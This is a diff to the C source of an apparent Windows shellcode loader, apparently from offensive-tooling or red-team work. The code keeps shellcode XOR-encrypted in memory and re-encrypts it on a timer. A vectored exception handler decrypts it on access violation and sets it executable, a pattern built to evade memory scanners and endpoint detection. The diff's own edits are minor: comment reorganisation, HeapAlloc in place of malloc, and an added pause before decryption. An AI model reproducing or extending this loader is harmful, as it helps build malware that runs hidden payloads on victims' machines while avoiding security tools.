@@ -2,6 +2,7 @@
 
 #include "common.h"
 
+// -------------------- Variables --------------------
 // XOR key
 BYTE bKey = 0x41;
 
@@ -11,6 +12,7 @@ HANDLE g_hTimerQueue = NULL;
 PBYTE g_pShellcode = NULL;
 SIZE_T g_sShellcodeSize = 0;
 
+// VC_PREF_BASES
 LPVOID VC_PREF_BASES[] = {
     (LPVOID)0x10000000,
     (LPVOID)0x20000000,
@@ -19,7 +21,8 @@ LPVOID VC_PREF_BASES[] = {
     (LPVOID)0x50000000
 };
 
-// Memcpy CRT replacement
+// -------------------- CRT replacements --------------------
+// memcpy
 void* MoveMem(void* dest, const void* src, unsigned int count) {
     unsigned char* dst8 = (unsigned char*)dest;
     const unsigned char* src8 = (const unsigned char*)src;
@@ -27,7 +30,6 @@ void* MoveMem(void* dest, const void* src, unsigned int count) {
     while (count--) {
         *dst8++ = *src8++;
     }
-
     return dest;
 }
 
@@ -43,7 +45,7 @@ unsigned char* ReadShellcode(const char* fileName, DWORD* dwSize) {
     }
     *dwSize = fileSize;
 
-    unsigned char* buffer = (unsigned char*)malloc(fileSize);
+    unsigned char* buffer = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, fileSize);
     if (!buffer) {
         CloseHandle(hFile);
         return NULL;
@@ -51,14 +53,14 @@ unsigned char* ReadShellcode(const char* fileName, DWORD* dwSize) {
 
     DWORD bytesRead = 0;
     if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
-        free(buffer);
+        HeapFree(GetProcessHeap(), 0, buffer);
         CloseHandle(hFile);
         return NULL;
     }
+
     CloseHandle(hFile);
     return buffer;
 }
-
 
 LPVOID GetShellcodeBaseAddress(HANDLE hHandle, DWORD szPage, DWORD stReservationGran, DWORD dwReservationBlocks){
     MEMORY_BASIC_INFORMATION mbi;
@@ -96,7 +98,7 @@ VOID XorByiKeys(PBYTE buf, SIZE_T size, BYTE bKey) {
 }
 
 VOID CALLBACK ReEncryptShellcodeCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired) {
-    PRINTA("[*] Timer triggered! Re-encrypting shellcode and setting to RO...\n");
+    PRINTA("[*] Timer Succesfully Triggered! Reverting To Read-Only...\n");
 
     // Re-encrypt shellcode
     XorByiKeys(g_pShellcode, g_sShellcodeSize, bKey);
@@ -108,7 +110,7 @@ VOID CALLBACK ReEncryptShellcodeCallback(PVOID lpParameter, BOOLEAN TimerOrWaitF
     PRINTA("[+] Shellcode re-encrypted successfully.\n");
 }
 
-// Temp VEH handler function
+// VEH handler function
 LONG WINAPI VectoredExceptionHandler(EXCEPTION_POINTERS* pExceptionInfo) {
     if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
         PRINTA("\t[!] VEH: Exception Caught!\n");
@@ -116,6 +118,9 @@ LONG WINAPI VectoredExceptionHandler(EXCEPTION_POINTERS* pExceptionInfo) {
         // Modify memory protection to allow decryption
         DWORD oldProtect;
         VirtualProtect(pExceptionInfo->ExceptionRecord->ExceptionInformation[1], g_sShellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+
+        PRINTA("[!] Press <Enter> To Decrypt Shellcode");
+        WAIT_FOR_ENTER();
 
         // Decrypt the shellcode
         PRINTA("\t[+] Decrypting Shellcode...\n");
